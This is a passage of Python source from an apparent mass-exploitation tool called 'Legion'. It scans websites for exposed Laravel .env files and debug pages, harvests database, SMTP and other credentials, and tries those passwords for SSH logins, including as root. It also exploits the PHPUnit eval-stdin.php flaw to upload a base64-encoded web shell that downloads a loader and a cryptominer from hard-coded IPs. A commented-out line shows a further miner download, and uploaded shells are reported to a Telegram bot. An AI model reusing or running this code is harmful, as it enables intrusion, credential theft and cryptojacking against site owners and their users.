						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						build2 = str(mailhost)+'|'+str(mailuser)+'|'+str(mailpass)+'|0'
						remover = str(build).replace('\r', '')
						remover2 = str(build2).replace('\r', '')
						print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}SMTP {fc}[{yl}{mailhost}{res}{fc}]")
						save = open('Results/SMTP(RANDOM)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						save = open('Results/SMTP(Legion_sender)#Debug.txt', 'a')
						save.write(remover2+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					return True
			else:
				return False
		except:
			return False
	def get_database(self, text, url):
		try:
			if "DB_HOST" in text:
				if "DB_HOST=" in text:
					method = '/.env'
					try:
						db_host = reg('\nDB_HOST=(.*?)\n', text)[0]
					except:
						db_host = ''
					try:
						db_port = reg('\nDB_PORT=(.*?)\n', text)[0]
					except:
						db_port = ''
					try:
						db_name = reg('\nDB_DATABASE=(.*?)\n', text)[0]
					except:
						db_name = ''
					try:
						db_user = reg('\nDB_USERNAME=(.*?)\n', text)[0]
					except:
						db_user = ''
					try:
						db_pass = reg('\nDB_PASSWORD=(.*?)\n', text)[0]
					except:
						db_pass = ''
				elif "<td>DB_HOST</td>" in text:
					method = 'debug'
					try:
						db_host = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_host = ''
					try:
						db_port = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_port = ''
					try:
						db_name = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_name = ''
					try:
						db_user = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_user = ''
					try:
						db_pass = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_pass = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_HOST: '+str(db_host)+'\nDB_PORT: '+str(db_port)+'\nDB_NAME: '+str(db_name)+'\nDB_USER: '+str(db_user)+'\nDB_PASS: '+str(db_pass)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}DATABASE {fc}[{yl}{db_host}{res}{fc}]")
				save = open('Results/DATABASE.txt', 'a')
				save.write(remover+'\n')
				save.close()
				build_forchecker = str(url)+"|"+str(db_host)+"|"+str(db_port)+"|"+str(db_user)+"|"+str(db_pass)+"|"+str(db_name)
				build_forchecker2 = str(url)+"|22|"+str(db_user)+"|"+str(db_pass)
				remover2 = str(build_forchecker).replace('\r', '')
				remover3 = str(build_forchecker2).replace('\r', '')
				if str(db_user) == "root":
					save3 = open('Results/forchecker/database_WHM.txt','a')
				else:
					save3 = open('Results/forchecker/database_Cpanels.txt','a')
				save3.write(remover2+'\n')
				save3.close()
				if str(db_user) == "root":
					save4 = open('Results/forchecker/database_ssh_root.txt','a')
				else:
					save4 = open('Results/forchecker/database_ssh.txt','a')
				save4.write(remover3+'\n')
				save4.close()
				return True
			else:
				return False
		except:
			return False
	def get_database2(self, text, url):
		pm = pma(url)
		pmp = pm.check()
		if 'DB_USERNAME=' in text:
			method = '/.env'
			db_host = re.findall('\nDB_HOST=(.*?)\n', text)[0]
			db_dbse = re.findall('\nDB_DATABASE=(.*?)\n', text)[0]
			db_user = re.findall('\nDB_USERNAME=(.*?)\n', text)[0]
			db_pass = re.findall('\nDB_PASSWORD=(.*?)\n', text)[0]
			build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\n'
			if pmp:
				build += 'PMA: ' + str(pmp) + '\n'
			build += 'HOST: ' + str(db_host) + '\nDATABSE: ' + str(db_dbse) + '\nUSERNAME: ' + str(db_user) + '\nPASSWORD: ' + str(db_pass) + '\n'
			remover = str(build).replace('\r', '')
			if pmp:
				fp = open('Results/phpmyadmin.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
			else:
				fp = open('Results/database_PMA.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
		elif '<td>DB_USERNAME</td>' in text:
			method = 'debug'
			db_host = re.findall('<td>DB_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_dbse = re.findall('<td>DB_DATABASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_user = re.findall('<td>DB_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_pass = re.findall('<td>DB_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\n'
			if pmp:
				build += 'PMA: ' + str(pmp) + '\n'
			build += 'HOST: ' + str(db_host) + '\nDATABSE: ' + str(db_dbse) + '\nUSERNAME: ' + str(db_user) + '\nPASSWORD: ' + str(db_pass) + '\n'
			remover = str(build).replace('\r', '')
			if pmp:
				fp = open('Results/phpmyadmin.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
			else:
				fp = open('Results/database.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
		return pmp
	def get_ssh1(self, text, url):
		#headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		#text = requests.get(url+"/.env", headers=headers, timeout=15, verify=False, allow_redirects=False).text
		if 'DB_PASSWORD' in text and 'DB_HOST' in text:
			if '://' in url:
				parse = url.split('://', 2)
				parse = parse[1]
				parse = parse.split('/')
				host = parse[0]
			else:
				parse = parse.split('/')
				host = parse[0]

			# grab password
			if 'DB_USERNAME=' in text:
				method = './env'
				db_user = re.findall("\nDB_USERNAME=(.*?)\n", text)[0]
				db_pass = re.findall("\nDB_PASSWORD=(.*?)\n", text)[0]
			elif '<td>DB_USERNAME</td>' in text:
				method = 'debug'
				db_user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				db_pass = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]

			# login ssh
			if db_user and db_pass:
				connected = 0
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				try:
					ssh.connect(host, 22, db_user, db_pass, timeout=3)

					fp = open('Results/!Vps.txt', 'a+')
					build = str(db_user)+':'+str(db_pass)+' ('+str(url)+') ['+str(host)+']'
					remover = str(build).replace('\r', '')
					fp.write(remover + '\n')
					fp.close()
					connected += 1
				except:
					pass
				finally:
					if ssh:
						ssh.close()

				if db_user != 'root':
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, 'root', db_pass, timeout=30)
						stdin, stdout, stderr = ssh.exec_command('uname -a', timeout=10)
						print (stdout.channel.recv_exit_status())
						fp = open('Results/!Vps.txt', 'a+')
						build = 'root'+':'+str(db_pass)+' ('+str(url)+') ['+str(host)+']'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

				if '_' in db_user:
					aw, iw = db_user.split('_')
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					#stdin, stdout, stderr = ssh.exec_command("cd /tmp; wget 185.213.209.151/kk.tar.gz; tar -zxf kk.tar.gz; mv dontkillme cpu; ./cpu -a cpupower -o stratum+tcp://mine.zpool.ca:6240 -u MQRaq9PgkzY6QXWF3dyjeeoVoiPtmzDBVQ -p yespowesugar=0.5,yespowerR16=0.5,power2b=03,c=LTC,sd=0.5,sd=0.1 --api-bind 0 --no-longpoll --randomize --cpu-affinity 0x555 --background")
					try:
						ssh.connect(host, 22, iw, db_pass, timeout=30)

						fp = open('Results/!Vps.txt', 'a+')
						build = str(db_user)+':'+str(db_pass)+' ('+str(url)+') ['+str(host)+']'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()
				if '-' in db_user:
					aw, iw = db_user.split('-')
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, aw, db_pass, timeout=30)

						fp = open('Results/!Vps.txt', 'a+')
						build = str(db_user)+':'+str(db_pass)+' ('+str(url)+') ['+str(host)+']'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, aw, db_pass, timeout=30)

						fp = open('Results/!Vps.txt', 'a+')
						build = str(db_user)+':'+str(db_pass)+' ('+str(url)+') ['+str(host)+']'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

				if connected > 0:
					return connected
				else:
					return False
		else:
			return False
	def get_ssh2(self, text, url):
		if "DB_USERNAME" in text:
			if "DB_USERNAME=" in text:
				method = '/.env'
				try:
					dabes_conn = reg('\nDB_CONNECTION=(.*)\n', text)[0]
				except:
					dabes_conn = ''
				try:
					dabes_host = reg('\nDB_HOST=(.*)\n', text)[0]
				except:
					dabes_host = ''
				try:
					dabes_port = reg('\nDB_PORT=(.*)\n', text)[0]
				except:
					dabes_port = ''
				try:
					dabes_name = reg('\nDB_DATABASE=(.*)\n', text)[0]
				except:
					dabes_name = ''
				try:
					dabes_auth = reg('\nDB_USERNAME=(.*)\n', text)[0]
				except:
					dabes_auth = ''
				try:
					dabes_pass = reg('\nDB_PASSWORD=(.*)\n', text)[0]
				except:
					dabes_pass = ''
			elif '<td>DB_USERNAME</td>':
				method = 'debug'
				try:
					dabes_conn = reg('<td>DB_CONNECTION<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_conn = ''
				try:
					dabes_host = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_host = ''
				try:
					dabes_port = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_port = ''
				try:
					dabes_name = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_name = ''
				try:
					dabes_auth = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_auth = ''
				try:
					dabes_pass = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_pass = ''
			if dabes_auth == "" or dabes_pass == "":
				return False
			else:
				if dabes_auth == "root":
					build = 'URL: '+str(url)+'|'+str(dabes_auth)+'|'+str(dabes_pass)
					remover = str(build).replace('\r', '')
					save = open('Results/VPS.txt', 'a')
					save.write(remover+'\n')
					save.close()
				else:
					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_CONNECTION: '+str(dabes_conn)+'\nDB_HOST: '+str(dabes_host)+'\nDB_PORT: '+str(dabes_port)+'\nDB_DATABASE: '+str(dabes_name)+'\nDB_USERNAME: '+str(dabes_auth)+'\nDB_PASSWORD: '+str(dabes_pass)
					remover = str(build).replace('\r', '')
					save = open('Results/MYSQL.txt', 'a')
					save.write(remover+'\n\n')
					save.close()

def printfa(text):
	''.join([str(item) for item in text])
	print(text),
pathname = 'Legion.php'

def phpunit(url):
    path = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    url = url + path
    phpinfo = "<?php phpinfo(); ?>"
    try:
        requester_1 = requests.post(url, data=phpinfo, timeout=15, verify=False)
        if "phpinfo()" in requester_1.text:
            payload_ = '<?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/'+pathname+'", "w") or die("Unable to open file!"); $code = "PD9waHAgZWNobyAnPGNlbnRlcj48aDE+TEVHSU9OIEVYUExPSVQgVjQgKE7Eg3ZvZGFyaSBQb3dlcik8L2gxPicuJzxicj4nLidbdW5hbWVdICcucGhwX3VuYW1lKCkuJyBbL3VuYW1lXSAnO2VjaG8nPGZvcm0gbWV0aG9kPSJwb3N0ImVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPic7ZWNobyc8aW5wdXQgdHlwZT0iZmlsZSJuYW1lPSJmaWxlIj48aW5wdXQgbmFtZT0iX3VwbCJ0eXBlPSJzdWJtaXQidmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7aWYoICRfUE9TVFsnX3VwbCddPT0iVXBsb2FkIil7aWYoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7ZWNobyc8Yj5MRUdJT04gRXhwbG9pdCBTdWNjZXNzITwvYj4nO31lbHNle2VjaG8nPGI+TEVHSU9OIEV4cGxvaXQgU3VjY2VzcyE8L2I+Jzt9fSBzeXN0ZW0oJ2N1cmwgLXMgLWsgMi41Ny4xMjIuMTEyL3JjZS9sb2FkIC1vIGFkaW5kZXgucGhwOyBjZCAvdG1wOyBjdXJsIC1PIDkxLjIxMC4xNjguODAvbWluZXIuanBnOyB0YXIgeHp2ZiBtaW5lci5qcGcgPiAvZGV2L251bGw7IHJtIC1yZiBtaW5lci5qcGc7IGNkIC54OyAuL3ggPiAvZGV2L251bGwnKTsKPz4="; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("LEGION EXPLOIT V3"); ?>'
            send_payload = requests.post(url, data=payload_, timeout=15, verify=False)
            if "LEGION EXPLOIT V3" in send_payload.text:
                status_exploit = "Successfully"
            else:
                status_exploit = "Can't exploit"
        else:
            status_exploit = "May not vulnerable"
    except Exception as err:
        status_exploit = 'ERROR: ' + str(err)
    return status_exploit

def prepare_phpunit(url):
    if "://" not in url:
        url = 'http://' + url
    if url.endswith('/'):
        url = url[:-1]

    get_status_exploit = phpunit(url)
    if get_status_exploit == "Successfully":
        print(f'{fc}[{gr}SHELL UPLOAD{fc}] {res}{url} {fc}/ {res}{pathname} {gr}Successfully')
        open('Results/!Legion_Shell.txt', 'a').write(url + '/' + pathname + '\n')
        message = {'text': f"🙈  Legion SMTP 6.5 BOT [SHELL UPLOAD]\n{url}/{pathname}\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
    elif get_status_exploit == "Can't exploit":
        print(f'{fc}[{gr}SHELL UPLOAD{fc}] {res}{url} {red}Can\'t exploit')
        open('Results/!Legion_error_spawn_shell.txt', 'a').write(url + '\n')
    else:
        print(f'{fc}[{gr}SHELL UPLOAD{fc}] {get_status_exploit}')

def legalegion22(url):
	global progres
	asu = url
	resp = False
	jmbt = [
    '/.env',
    #'/core/.env',
    #'/beta/.env',
    #'/backend/.env',
    #'/laravel/.env',
    #'/kyc/.env',
    #'/frontend/.env',
    #'/admin/.env',
    #'/prod/.env',
    #'/api/.env',
    #'/production/.env',
    #'/home/.env',
    #'/.env.example',
    #'/.env.local',
    #'/.env.bak',
    #'/config.env',
    #'/.env.production',
    #'/public/.env',
    #'/vendor/.env',
    '/sendgrid/.env'
		]
	tmpix = [
		'/',
		#'/core/.env',
		#'/core/',
		#'/beta/',
		#'/laravel/.env',
        #'/sendgrid/.env',
        '/sendgrid/'
		#'/kyc/',
		#'/admin/',
		#'/prod/',
		#'/api/',
		#'/public/'
		]
	try:
		text = '\033[32;1m#\033[0m '+url
		for ilu in jmbt:
			headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
			get_source = requests.get(url+ilu, headers=headers, timeout=5, verify=False, allow_redirects=False).text
			if "APP_KEY=" in get_source:
				resp = get_source
			else:
				get_apache = requests.post(url+'/_profiler/phpinfo', headers=headers, timeout=5, verify=False, allow_redirects=False).text
				if "phpinfo()" in get_apache:
					resp2 = get_apache
					apache = str(url).replace('\r', '')
					saveapache = open('Results/logsites/apache.txt','a')
					saveapache.write(apache+'\n')
					saveapache.close()
				if resp:
					remover2 = str(url+ilu).replace('\r', '')
					save3 = open('Results/logsites/vulnerable.txt','a')
					save3.write(remover2+'\n')
					save3.close()
					rawmode = legion().get_Vps(resp, url)
					manual = legion().get_manual(resp, url)
					getappkey = legion().get_appkey(resp, url)
					getmailgun = legion().get_mailgun(resp, url)
					getsmtp = legion().get_smtp(resp, url)
					getsmtp2 = legion().get_smtp2(resp, url)
					getwtilio = legion().get_twillio(resp, url)
					getwtilio2 = legion().get_twillio2(resp, url)
					smsapi = legion().get_nexmo(resp, url)
					getaws = legion().get_aws_data(resp, url)
					getpp = legion().payment_api(resp, url)
					getdb = legion().get_database(resp, url)
					getdb2 = legion().get_database2(resp, url)
					getssh1 = legion().getSSH(resp, url)
					getwtilio2 = legion().get_nexmo2(resp, url)
					getssh1 = legion().get_ssh1(resp, url)
					getwtilio2 = legion().get_ssh2(resp, url)

				else:
					#text += f' {red}| {yl}Can\'t get everything\033[0m'
					save = open('Results/logsites/not_vulnerable.txt','a')
					asu = str(url).replace('\r', '')
					save.write(asu+ilu+'\n')
					save.close()

			progres = progres + 1
			printfa(f'{fc}❍  {red}[{gr}{str(progres)}{red}] {text} {red}✗')
	except:
		pass
def legalegion(url):
	global progres
	asu = url
	resp = False
	jmbt = [
    '/.env',
    #'/core/.env',
    #'/beta/.env',
    #'/backend/.env',
    #'/laravel/.env',
    #'/kyc/.env',
    #'/frontend/.env',
    #'/admin/.env',
    #'/prod/.env',
    #'/api/.env',
    #'/production/.env',
    #'/home/.env',
    #'/.env.example',
    #'/.env.local',
    #'/.env.bak',
    #'/config.env',
    #'/.env.production',
    #'/public/.env',
    #'/vendor/.env',
    '/sendgrid/.env'
		]
	tmpix = [
		'/',
		#'/core/.env',
		#'/core/',
		#'/beta/',
		#'/laravel/.env',
        #'/sendgrid/.env',
        '/sendgrid/'
		#'/kyc/',
		#'/admin/',
		#'/prod/',
		#'/api/',
		#'/public/'
		]
	try:
		for ilu in jmbt:
			text = f'{red}# {res} {fc}[{res}{url}{gr}{fc}]'
			headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
			get_source = requests.get(url+ilu, headers=headers, timeout=5, verify=False, allow_redirects=False).text
			if "APP_KEY=" in get_source:
				resp = get_source
			else:
				get_source = requests.post(url, data={"0x01[]":"legion"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
				if "<td>APP_KEY</td>" in get_source:
					resp = get_source
			if resp:
				remover2 = str(url).replace('\r', '')
				save3 = open('Results/logsites/vulnerable.txt','a')
				save3.write(remover2+'\n')
				save3.close()
				rawmode = legion().get_ssh2(resp, url)
				manual = legion().get_manual(resp, url)
				getappkey = legion().get_appkey(resp, url)
				getmailgun = legion().get_mailgun(resp, url)
				getsmtp = legion().get_smtp(resp, url)
				getsmtp2 = legion().get_smtp2(resp, url)
				getwtilio = legion().get_twillio(resp, url)
				getwtilio2 = legion().get_twillio2(resp, url)
				smsapi = legion().get_nexmo(resp, url)
				getaws = legion().get_aws_data(resp, url)
				getpp = legion().payment_api(resp, url)
				getdb = legion().get_database(resp, url)
				getdb2 = legion().get_database2(resp, url)
				getssh1 = legion().getSSH(resp, url)
				getwtilio2 = legion().get_nexmo2(resp, url)
				getssh1 = legion().get_ssh2(resp, url)
				getwtilio4 = legion().get_shodan(resp, url)

			else:
				#text += f' {red}| {yl}Can\'t get everything\033[0m'
				save = open('Results/logsites/not_vulnerable.txt','a')
				asu = str(url).replace('\r', '')
				save.write(asu+'\n')
				save.close()



			progres = progres + 1
			printfa(f'{fc}❍ {red}[{gr}{ntime()}{red}] {red}[{gr}{str(progres)}{red}] {text} {red}✗')
	except:
		pass



class grabber:
    def get_smtp(self, method, urlku, teks):
        oke = 0
        if method == 'env':
            if 'MAIL_HOST=' in teks:
                try:
                    host = re.findall('MAIL_HOST=(.*?)\n', teks)
                    if len(host) > 0:
                        # print(urlku,len(host))
                        for iii in range(len(host)):
                            try:
                                host = re.findall('MAIL_HOST=(.*?)\n', teks)[iii]
                                if '\r' in host:
                                    host = host.replace('\r', '')
                                port = re.findall('MAIL_PORT=(.*?)\n', teks)[iii]
                                if '\r' in port:
                                    port = port.replace('\r', '')
                                user = re.findall('MAIL_USERNAME=(.*?)\n', teks)[iii]
                                if '\r' in user:
                                    user = user.replace('\r', '')
                                pw = re.findall('MAIL_PASSWORD=(.*?)\n', teks)[iii]
                                if '\r' in pw:
                                    pw = pw.replace('\r', '')
                                if user == 'null' or user == '""' or user == '' or '****' in user:
                                    pass
                                else:
                                    satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
                                    if '.gmail.com' in host or '.googlemail.com' in host:
                                        with open('Result(method2)/SMTP/gmail.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2],
                                                   satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif 'sendinblue' in host:
                                        with open('Result(method2)/SMTP/sendinblue.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2],
                                                   satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif 'smtp.sendgrid.net' in host:
                                        if 'apikey' in user:
                                            with open('Result(method2)/SMTP/sendgrid_apikey.txt', 'a') as pow:
                                                pow.write(satu + '\n')
                                            ceker_sendgrid2(urlku, satu.split('|')[4])
                                        else:
                                            with open('Result(method2)/SMTP/sendgrid.txt', 'a') as pow:
                                                pow.write(satu + '\n')
                                            smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif '.office365.com' in host:
                                        with open('Result(method2)/SMTP/office365.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2],
                                                   satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif '.mailgun.' in host:
                                        with open('Result(method2)/SMTP/mailgun.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2],
                                                   satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif '.mailtrap.io' in host:
                                        with open('Result(method2)/SMTP/mailtrap.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        # smtp_login(teks,'env',host,port,user,pw)
                                        oke += 1
                                    elif '.zoho.' in host:
                                        with open('Result(method2)/SMTP/zoho.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2],
                                                   satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif '1and1' in host:
                                        with open('Result(method2)/SMTP/1and1.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],
                                                   satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif '.amazonaws.' in host:
                                        open('Result(method2)/SMTP/smtp_aws.txt', 'a').write(satu + '\n')
                                        smtp_login2(teks, 'env', host, port, user, pw)
                                    else:
                                        with open('Result(method2)/SMTP/other.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2],
                                                   satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                            except:
                                pass
                    else:
                        host = re.findall('MAIL_HOST=(.*?)\n', teks)[0]
                        if '\r' in host:
                            host = host.replace('\r', '')
                        port = re.findall('MAIL_PORT=(.*?)\n', teks)[0]
                        if '\r' in port:
                            port = port.replace('\r', '')
                        user = re.findall('MAIL_USERNAME=(.*?)\n', teks)[0]
                        if '\r' in user:
                            user = user.replace('\r', '')
                        pw = re.findall('MAIL_PASSWORD=(.*?)\n', teks)[0]
                        if '\r' in pw:
                            pw = pw.replace('\r', '')
                        if user == 'null' or user == '""' or user == '' or '****' in user or "$_SERVER['MAIL_USERNAME']" in user:
                            pass
                        else:
                            satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
                            # print(satu)
                            # with open('Result(method2)/smtp.txt','a') as tulis:
                            #    tulis.write(satu+'\n')
                            if '.gmail.com' in host or '.googlemail.com' in host:
                                with open('Result(method2)/SMTP/gmail.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                            elif 'sendinblue' in host:
                                with open('Result(method2)/SMTP/sendinblue.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                            elif 'smtp.sendgrid.net' in host:
                                if 'apikey' in user:
                                    with open('Result(method2)/SMTP/sendgrid_apikey.txt', 'a') as pow:
                                        pow.write(satu+'\n')
                                    ceker_sendgrid2(urlku,satu.split('|')[4])
                                else:
                                    with open('Result(method2)/SMTP/sendgrid.txt', 'a') as pow:
                                        pow.write(satu+'\n')
                                        smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                            elif '.office365.com' in host:
                                with open('Result(method2)/SMTP/office365.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
                                           satu.split('|')[4])
                                oke += 1
                            elif '.mailgun.' in host:
                                with open('Result(method2)/SMTP/mailgun.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
                                           satu.split('|')[4])
                                oke += 1
                            elif '.mailtrap.io' in host:
                                with open('Result(method2)/SMTP/mailtrap.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                # smtp_login(teks,'env',host,port,user,pw)
                                oke += 1
                            elif '.zoho.' in host:
                                with open('Result(method2)/SMTP/zoho.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
                                           satu.split('|')[4])
                                oke += 1
                            elif '1and1' in host:
                                with open('Result(method2)/SMTP/1and1.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
                                           satu.split('|')[4])
                                oke += 1
                            elif '.amazonaws.' in host:
                                open('Result(method2)/SMTP/smtp_aws.txt', 'a').write(satu + '\n')
                                smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
                                           satu.split('|')[4])
                            else:
                                with open('Result(method2)/SMTP/other.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                smtp_login2(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
                                           satu.split('|')[4])
                                oke += 1
                except:
                    pass
            if 'SMTP_HOST=' in teks:
                try:
                    host = re.findall('SMTP_HOST=(.*?)\n', teks)[0]
                    if '\r' in host:
                        host = host.replace('\r', '')
                    port = re.findall('SMTP_PORT=(.*?)\n', teks)[0]
                    if '\r' in port:
                        port = port.replace('\r', '')
                    user = re.findall('SMTP_USERNAME=(.*?)\n', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    pw = re.findall('SMTP_PASSWORD=(.*?)\n', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    if user == 'null' or user == '""' or user == '' or '****' in user:
                        pass
                    else:
                        satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
                        # with open('Result(method2)/smtp.txt','a') as tulis:
                        #    tulis.write(satu+'\n')
                        if '.gmail.com' in host or '.googlemail.com' in host:
                            with open('Result(method2)/SMTP/gmail.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '.sendgrid.net' in host:
                            with open('Result(method2)/SMTP/sendgrid.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '.office365.' in host:
                            with open('Result(method2)/SMTP/office365.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '.mailgun.' in host:
                            with open('Result(method2)/SMTP/mailgun.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '.mailtrap.io' in host:
                            with open('Result(method2)/SMTP/mailtrap.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '.zoho.' in host:
                            with open('Result(method2)/SMTP/zoho.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '1and1' in host:
                            with open('Result(method2)/SMTP/1and1.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        else:
                            with open('Result(method2)/SMTP/other.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                except:
                    pass
            if oke == 0:
                return False
            else:
                return oke
        elif method == 'debug':
            if 'MAIL_HOST' in teks:
                try:
                    host = re.findall('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    # print(host)
                    if '\r' in host:
                        host = host.replace('\r', '')
